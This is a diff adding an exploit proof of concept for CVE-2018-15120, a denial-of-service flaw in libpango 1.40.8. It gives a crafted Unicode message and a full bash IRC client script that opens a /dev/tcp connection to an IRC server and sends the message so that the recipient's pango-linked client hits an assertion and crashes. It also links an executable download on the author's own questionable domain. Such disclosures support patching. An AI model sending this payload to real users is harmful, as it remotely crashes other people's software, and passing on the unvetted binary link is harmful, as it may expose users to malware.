@@ -1,0 +1,108 @@
+# Exploit Title: Libpango 1.40.8 - Denial of Service (PoC)
+# Date: 2018-08-06
+# Exploit Author: Jeffery M
+# Vendor Homepage: https://www.pango.org/
+# Software Link: http://ftp.gnome.org/pub/GNOME/sources/pango/1.40/pango-1.40.9.tar.xz
+# Version: 1.40.8+
+# Tested on: Windows 7, Gentoo
+# CVE : CVE-2018-15120
+
+# Patch : https://github.com/GNOME/pango/commit/71aaeaf020340412b8d012fe23a556c0420eda5f
+
+# Description:
+# Invalid Unicode sequences, such as 0x2665 0xfe0e 0xfe0f, can trick the
+# Emoji iter code into returning an empty segment, which then triggers
+# an assertion in the itemizer.
+
+# POC:
+# Save the below as irc_com_dump; chmod +x irc_com_dump;connect to an
+# irc server with something linked against libpango 1.40.8 or higher
+# (e.g. hexchat 2.14.1 [ can be obtained on my server
+# http://order.a.whore.website/HexChat%202.14.1%20x86.exe ), then run
+# the following:
+
+irc_com_dump $'privmsg someuser :\u2665\uFE0E\uFE0F'
+
+This is a rudimentary example of how this attack can be used.
+
+#!/bin/bash
+# Name: irc_com_dump
+# Save this script as irc_com_dump
+# run as follows on irc.laks.ml or a server of your choice
+# irc_com_dump $'privmsg someuser :\u2665\uFE0E\uFE0F'
+# When the user receives the message it will trigger the assertion fail.
+###
+helpfunc ()
+{
+sed  -nre '/sed/d;/bash/,/###/{1d;s/^# //g;s/###//;p}' $0;
+
+}
+if [[ $# -lt 1 ]] || [[ $1 =~ ^-?-h ]] ; then
+helpfunc && exit 1
+fi
+
+
+# So we can send unicode without having to do shit.
+LC_ALL=en_US.utf8
+export LC_ALL
+
+
+export allargs=("$@")
+#test_ping ()
+#{
+#        if [[ ! -n $PING ]]; then
+#       export PING="$(echo $h| awk '/PING/{print "PONG "$2}')";
+#       fi;
+#}
+if [[ -n ${DEBUG} ]] ; then
+declare -p allargs
+fi
+
+export name=magicrun${RANDOM}
+if [[ -n ${NORANDOM} ]] ; then
+        export name=magicdebug
+fi
+run_irc_com ()
+{
+set -vx
+    echo ${allargs[1]}
+#    if  ( ( ( [[ ! ${allargs[1]} =~ [a-zA-Z].* ]] || true) && ( [[
+${allargs[1]} =~ [0-9].*[0-9] ]] &&  [[ ! ${allargs[0]}  =~ .*[.].*
+]] || true) ) )     ; then
+if [[ ! ${allargs[0]}  =~ .*[.].* &&  ${allargs[1]} =~ ^[0-9]+[0-9]?$
+&& ! ${allargs[1]} =~ .*[a-zA-Z].* || $# -eq 1 ]] ; then
+    export COMM="$@";
+    else
+    export s=$1
+    export p=$2
+    export COMM="${@:3}"
+        if [[ $p =~ .*[a-zA-Z] ]] ; then
+                unset s p
+                export COMM="${allargs[@]}"
+        fi
+    fi
+
+    test -z $s||false  && exec 5<> /dev/tcp/irc.laks.ml/6667 || test
+-n $s && echo s is $s;exec 5<>/dev/tcp/$s/$p
+set +vx
+    echo -e 'USER '${name}' 8 ''*'' :'${name}'\nNICK '${name}'\n' 1>&5
+2>&1 | stdbuf -i0 -o0 cat - 0<&5 > /dev/stdout | while read h; do
+        if [[ ! -n $PING ]]; then
+            export PING="$(echo $h| awk '/PING/{print "PONG "$2}')";
+        fi;
+##      test_ping;
+echo -e "${PING}\n" 1>&5
+        if [[ ! -n $PINGSENT ]] && [[ -n $PING ]] ; then
+            export PINGSENT=isentmyping;
+        fi;
+        if [[ -z $COMMSENT ]] && [[ -n $PINGSENT ]] && [[ -n $PING ]] ; then
+echo -e "${COMM}\nQUIT\n" 1>&5 2>&1
+fi
+        echo "$h" 2>&1;
+    done
+
+}
+
+run_irc_com ${allargs[@]} |& sed -ne "/:$name MODE $name
+:+iwx/,/\x04/p" | sed -e "/:$name MODE $name/d" -e '/^ERROR
+:Closing/d' | awk -F" $name " '{print $2}'
